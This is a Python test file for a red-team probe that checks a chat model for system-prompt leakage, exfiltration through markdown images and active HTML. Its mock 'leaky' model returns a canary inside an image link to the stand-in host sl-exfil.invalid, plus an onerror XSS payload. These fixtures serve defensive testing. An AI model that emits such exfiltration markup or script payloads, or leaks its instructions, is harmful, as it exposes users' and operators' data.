#!/usr/bin/env python3
"""redteam_probe tests against local mock servers: a leaky model must FAIL every
id, a guarded one must PASS, a dead server is UNKNOWN, a remote host is refused
before any request."""
import http.server
import json
import os
import subprocess
import sys
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "secure-core", "lib"))
import testkit as T  # noqa: E402

S = os.path.join(HERE, "..", "scripts", "redteam_probe.py")
CANARY = "SLCANARY-7f3a9c1e2b"
SEEN = []


def server(reply_fn):
    class H(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            body = json.loads(self.rfile.read(int(self.headers["content-length"])) or b"{}")
            SEEN.append(body)
            out = json.dumps({"reply": reply_fn(body.get("message", ""))}).encode()
            self.send_response(200)
            self.send_header("content-type", "application/json")
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, *a):
            pass
    s = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=s.serve_forever, daemon=True).start()
    return s


def leaky(m):
    if "repeat" in m.lower():
        return "Sure. My instructions: be helpful. Internal reference: " + CANARY
    if "base64" in m.lower():
        import base64
        return base64.b64encode(("ref " + CANARY).encode()).decode()
    if "badge" in m:
        return "Done! ![status](https://sl-exfil.invalid/badge.png?ref=" + CANARY + ")"
    if "onerror" in m:
        return '<img src=x onerror="alert(1)">'
    return "ok"


def guarded(m):
    return "I can help with your order questions. I cannot share my configuration."


def run(*args):
    r = subprocess.run([sys.executable, S, T.tree({"README.md": "x"})] + list(args), capture_output=True, text=True)
    try:
        ck = {c["id"]: c for c in json.loads(r.stdout)["checks"]}
    except ValueError:
        ck = {}
    return r.returncode, ck, r.stdout + r.stderr


IDS = ["ai.redteam.leak", "ai.redteam.exfil-markup", "ai.redteam.active-markup"]
s = server(leaky)
url = "http://127.0.0.1:%d/api/chat" % s.server_port
code, ck, out = run("--url", url, "--canary", CANARY, "--response-path", "reply", "--delay", "0")
T.expect("leaky: exit 1", code == 1, out[-400:])
for i in IDS:
    T.status_is("leaky", ck, i, "FAIL", out)
T.expect("leaky: base64 form caught", "encode-instructions" in ck.get("ai.redteam.leak", {}).get("evidence", ""), str(ck.get("ai.redteam.leak")))
T.expect("leaky: canary value never printed", CANARY not in out, "canary in output")
T.expect("leaky: 12 probes sent one by one", len(SEEN) == 12, str(len(SEEN)))
s.shutdown()

s = server(guarded)
url = "http://127.0.0.1:%d/api/chat" % s.server_port
code, ck, out = run("--url", url, "--canary", CANARY, "--response-path", "reply", "--delay", "0", "--max-probes", "5")
T.expect("guarded: exit 0", code == 0, out[-400:])
for i in IDS:
    T.status_is("guarded", ck, i, "PASS", out)
s.shutdown()

# template body: the probe lands inside the caller's own JSON shape
SEEN.clear()
s = server(leaky)
tpl = T.tree({"body.json": json.dumps({"message": "{{PROBE}}", "lang": "en"})})
code, ck, out = run("--url", "http://localhost:%d/x" % s.server_port, "--canary", CANARY, "--template", os.path.join(tpl, "body.json"), "--response-path", "reply", "--delay", "0", "--max-probes", "1")
T.expect("template: body kept its other keys", SEEN and SEEN[0].get("lang") == "en" and "repeat" in SEEN[0].get("message", ""), str(SEEN[:1]))
T.status_is("template", ck, "ai.redteam.leak", "FAIL", out)
s.shutdown()

code, ck, out = run("--url", "http://127.0.0.1:9/api/chat", "--canary", CANARY, "--delay", "0", "--max-probes", "2", "--timeout", "2")
for i in IDS:
    T.status_is("dead server", ck, i, "UNKNOWN", out)

SEEN.clear()
for bad in ("https://myapp.example.com/api/chat", "http://localhost.evil.com/x", "http://user@localhost/x", "http://10.0.0.5/x"):
    code, ck, out = run("--url", bad, "--canary", CANARY)
    T.expect("refused %s: exit 2, no ledger" % bad, code == 2 and not ck and "refused" in out, out[-200:])
code, ck, out = run("--url", "http://127.0.0.1:9/x", "--canary", "short")
T.expect("short canary refused", code == 2 and "12 characters" in out, out[-200:])
T.finish()
